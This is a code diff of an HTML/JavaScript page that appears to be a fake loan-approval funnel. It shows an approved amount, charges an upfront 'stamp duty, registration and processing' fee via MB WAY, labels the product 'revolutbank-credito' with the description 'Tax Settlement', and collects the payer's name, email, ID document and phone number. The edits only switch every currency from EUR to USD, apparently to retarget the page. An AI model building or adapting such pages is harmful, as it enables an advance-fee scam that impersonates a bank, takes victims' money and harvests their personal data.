@@ -937,7 +937,7 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
           </svg>
           Approved Amount
         </div>
-        <div class="approved-amount" id="approvedAmount">€ ---</div>
+        <div class="approved-amount" id="approvedAmount">$ ---</div>
         <div class="approved-installments" id="installmentsText">---</div>
       </div>
       <!-- VSL Video -->
@@ -995,22 +995,22 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
       <div class="pricing-card">
   <div class="pricing-row">
   <span class="pricing-label">Stamp Duty</span>
-  <span class="pricing-value">€ 18,42</span>
+  <span class="pricing-value">$ 18,42</span>
 </div>
 
 <div class="pricing-row">
   <span class="pricing-label">Contractual Registration</span>
-  <span class="pricing-value">€ 6,80</span>
+  <span class="pricing-value">$ 6,80</span>
 </div>
 
 <div class="pricing-row">
   <span class="pricing-label">Processing</span>
-  <span class="pricing-value">€ 3,75</span>
+  <span class="pricing-value">$ 3,75</span>
 </div>
 
 <div class="pricing-row total">
   <span class="pricing-label">Total Amount</span>
-  <span class="pricing-value" data-fee-liberacao>€ 28,97</span>
+  <span class="pricing-value" data-fee-liberacao>$ 28,97</span>
 </div>
       </div>
       <button class="cta-button" id="ctaButton" onclick="handleCTA()" style="display:block!important">
@@ -1050,7 +1050,7 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
 
         <div class="ms-amount-card">
           <div class="ms-amount-label">Amount due</div>
-          <div class="ms-amount-val" data-fee-amount>€ 28,97</div>
+          <div class="ms-amount-val" data-fee-amount>$ 28,97</div>
         </div>
 
         <button onclick="goToMBWayForm()" style="display:flex;align-items:center;justify-content:center;gap:12px;width:100%;padding:18px;background:#0a0a0a;color:#fff;border:0;border-radius:16px;font-size:17px;font-weight:800;font-family:inherit;cursor:pointer;margin:8px 0 4px;letter-spacing:-.2px;">
@@ -1080,7 +1080,7 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
 
         <div class="ms2-amount-card">
           <div class="ms2-amount-label">Amount due</div>
-          <div class="ms2-amount-val" id="ms2AmountVal" data-fee-amount>28,97 €</div>
+          <div class="ms2-amount-val" id="ms2AmountVal" data-fee-amount>28,97 $</div>
         </div>
 
         <div class="ms2-phone-label">MB WAY Phone Number</div>
@@ -1092,7 +1092,7 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
 
         <div id="payError" style="display:none;color:#b91c1c;font-size:13px;background:#fef2f2;padding:10px 12px;border-radius:8px;margin-bottom:14px;"></div>
 
-        <button class="ms2-pay-btn" id="paySubmitBtn" onclick="submitMBWay()"><span data-msg="liberacao.t26">Pay € 28,97 with MB WAY</span></button>
+        <button class="ms2-pay-btn" id="paySubmitBtn" onclick="submitMBWay()"><span data-msg="liberacao.t26">Pay $ 28,97 with MB WAY</span></button>
       </div>
 
       <!-- STEP 3: Pending/Result -->
@@ -1135,7 +1135,7 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
       if (approvedAmount) {
         const amount = parseMoney(approvedAmount);
         if (!isNaN(amount) && amount > 0) {
-          document.getElementById('approvedAmount').textContent = amount.toLocaleString('pt-PT', { style: 'currency', currency: 'EUR' });
+          document.getElementById('approvedAmount').textContent = amount.toLocaleString('pt-PT', { style: 'currency', currency: 'USD' });
           // Always recalculate monthly from amount
           const months = parseInt(installments) || 120;
           const monthlyRate = 0.0081;
@@ -1143,7 +1143,7 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
           if (isNaN(monthly) || monthly <= 0) {
             monthly = (amount * (monthlyRate * Math.pow(1 + monthlyRate, months))) / (Math.pow(1 + monthlyRate, months) - 1);
           }
-          document.getElementById('installmentsText').textContent = months + 'x de ' + monthly.toLocaleString('pt-PT', { style: 'currency', currency: 'EUR' });
+          document.getElementById('installmentsText').textContent = months + 'x de ' + monthly.toLocaleString('pt-PT', { style: 'currency', currency: 'USD' });
         }
       }
     }
@@ -1222,7 +1222,7 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
     }
 
     function fmtPaySuffix() {
-      return getLiberacaoEuros().toFixed(2).replace('.', ',') + ' €';
+      return getLiberacaoEuros().toFixed(2).replace('.', ',') + ' $';
     }
 
     function applyLiberacaoFeesFromAdmin() {
@@ -1296,7 +1296,7 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
               totalPriceInCents:      getLiberacaoCents(),
               gatewayFeeInCents:      0,
               userCommissionInCents:  getLiberacaoCents(),
-              currency:               'EUR'
+              currency:               'USD'
             },
             isTest: false
           })
@@ -1377,7 +1377,7 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
           body: JSON.stringify({
             amount:        getLiberacaoEuros(),
             method:        'mbway',
-            currency:      'EUR',
+            currency:      'USD',
             payer: { name, email, document: doc, phone },
             product:       'revolutbank-credito',
             paymentDescription: 'Tax Settlement',
@@ -1403,7 +1403,7 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
     }
 
     function showMBWayPending(phone, txId) {
-      const payLabel = '€ ' + getLiberacaoEuros().toFixed(2).replace('.', ',');
+      const payLabel = '$ ' + getLiberacaoEuros().toFixed(2).replace('.', ',');
       document.getElementById('payStep-form').style.display = 'none';
       document.getElementById('payResultContent').innerHTML =
         '<div class="spin">⏳</div>' +
